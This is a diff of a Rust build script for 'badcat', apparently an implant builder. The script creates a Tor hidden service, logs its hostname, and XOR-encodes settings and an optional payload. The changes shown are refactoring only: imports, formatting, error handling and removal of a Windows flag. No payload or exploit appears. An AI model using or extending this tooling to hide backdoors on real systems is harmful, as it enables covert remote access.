@@ -1,6 +1,6 @@
 use std::io::Read;
-use std::path::{Path, PathBuf};
-use std::{collections, env, error, io, fs, process};
+use std::path::PathBuf;
+use std::{collections, env, error, fs, io};
 
 use badcat_lib::{secrets, xor};
 use json::JsonValue;
@@ -16,9 +16,6 @@ struct BuildSetting {
 
     /// Which file to save information about
     hosts_file: PathBuf,
-
-    /// Whether or not the target is a Windows NT machine
-    is_tor_for_windows: bool,
 
     /// XOR encryption key
     key: String,
@@ -48,10 +45,16 @@ fn main() -> Result<(), Box<dyn error::Error>> {
     let setting = parse_settings(&raw_settings);
 
     println!("cargo:rerun-if-changed={}", CFG_SETTINGS);
-    println!("cargo:rerun-if-changed={}", setting.torrc_file.to_str().unwrap());
+    println!(
+        "cargo:rerun-if-changed={}",
+        setting.torrc_file.to_str().unwrap()
+    );
 
     if setting.uses_payload {
-        println!("cargo:rerun-if-changed={}", setting.payload_file.to_str().unwrap());
+        println!(
+            "cargo:rerun-if-changed={}",
+            setting.payload_file.to_str().unwrap()
+        );
     }
 
     let mut replacements = collections::HashMap::new();
@@ -71,7 +74,7 @@ fn encode_bundle(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>
     let dir = tempfile::tempdir()?;
 
     let hs = HiddenService::new()?;
-    hs.to_fs(dir.path().to_path_buf());
+    hs.to_fs(dir.path().to_path_buf())?;
 
     add_host(hs.hostname, &setting)?;
 
@@ -110,7 +113,7 @@ fn encode_data(setting: &BuildSetting) -> String {
     xor::encode(&setting.key, &json::stringify(data))
 }
 
-/// Read the payload file and encode with XOR 
+/// Read the payload file and encode with XOR
 fn encode_payload(setting: &BuildSetting) -> io::Result<String> {
     let payload = if setting.uses_payload {
         let mut file = fs::File::open(&setting.payload_file).expect("problem reading payload file");
@@ -157,7 +160,7 @@ fn load_settings() -> json::Result<json::JsonValue> {
     json::parse(&source)
 }
 
-/// Replace every ocorrence from `template` into `destination`. 
+/// Replace every ocorrence from `template` into `destination`.
 fn replace_settings(
     template: &str,
     destination: &str,
@@ -233,7 +236,6 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
     }
 
     BuildSetting {
-        is_tor_for_windows,
         name,
         hosts_file,
         key,
